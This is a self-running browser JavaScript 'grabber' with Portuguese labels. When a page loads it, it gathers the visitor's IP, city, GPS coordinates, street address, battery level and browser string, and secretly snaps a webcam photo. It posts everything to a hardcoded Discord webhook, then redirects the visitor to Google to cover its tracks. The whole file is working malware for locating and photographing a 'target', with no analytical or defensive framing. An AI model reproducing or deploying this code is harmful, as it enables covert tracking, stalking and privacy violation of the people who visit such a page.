(() => {
  const WEBHOOK = 'https://discord.com/api/webhooks/1434614991432060968/VajxFHeGfgtIEUeV4nggqafz3Si0nuNKurVPz63JThFYHPWREkvvlHO5hvRbK2YXe-rH';

  const send = async (data) => {
    const embed = {
      title: "ALVO CAÇADO - LOCALIZAÇÃO EXATA",
      color: 0xff0000,
      fields: [
        { name: "IP", value: data.ip, inline: true },
        { name: "Cidade", value: data.city, inline: true },
        { name: "Rua", value: data.rua || "N/A" },
        { name: "GPS", value: `${data.lat}, ${data.lon}`, inline: true },
        { name: "Precisão", value: `${data.acc}m`, inline: true },
        { name: "Bateria", value: `${data.bat}%`, inline: true },
        { name: "Navegador", value: data.ua.slice(0, 50) + "...", inline: false }
      ],
      image: { url: data.foto },
      timestamp: new Date().toISOString(),
      footer: { text: "Grabber v3 - 100% Exato" }
    };

    try {
      await fetch(WEBHOOK, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ embeds: [embed] })
      });
    } catch (e) { console.error(e); }
  };

  const start = async () => {
    document.getElementById("load").style.display = "block";

    try {
      // IP
      const ipRes = await fetch("https://api.ipify.org?format=json");
      const ipData = await ipRes.json();
      const ip = ipData.ip;

      // GEO (CORS OK)
      const geoRes = await fetch("https://ipwho.is/");
      const geo = await geoRes.json();

      // GPS
      const pos = await new Promise((res, rej) => {
        navigator.geolocation.getCurrentPosition(res, rej, { timeout: 15000, enableHighAccuracy: true });
      });

      // RUA
      const ruaRes = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${pos.coords.latitude}&lon=${pos.coords.longitude}&format=json`);
      const ruaData = await ruaRes.json();
      const rua = ruaData.display_name || "N/A";

      // BATERIA
      const batNav = await navigator.getBattery();
      const bat = Math.round(batNav.level * 100);

      // FOTO
      const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 } });
      const video = document.createElement("video");
      video.srcObject = stream;
      video.play();
      await new Promise(r => setTimeout(r, 2500));
      const canvas = document.createElement("canvas");
      canvas.width = 320; canvas.height = 240;
      canvas.getContext("2d").drawImage(video, 0, 0, 320, 240);
      const foto = canvas.toDataURL("image/jpeg", 0.8);
      stream.getTracks().forEach(t => t.stop());

      // ENVIA
      await send({
        ip,
        city: geo.city,
        rua,
        lat: pos.coords.latitude,
        lon: pos.coords.longitude,
        acc: Math.round(pos.coords.accuracy),
        bat,
        foto,
        ua: navigator.userAgent
      });

      setTimeout(() => { window.location = "https://google.com"; }, 2000);

    } catch (e) {
      await send({ ip: "ERRO", city: e.message });
    }
  };

  // INICIA AUTOMÁTICO
  setTimeout(start, 1000);
})();
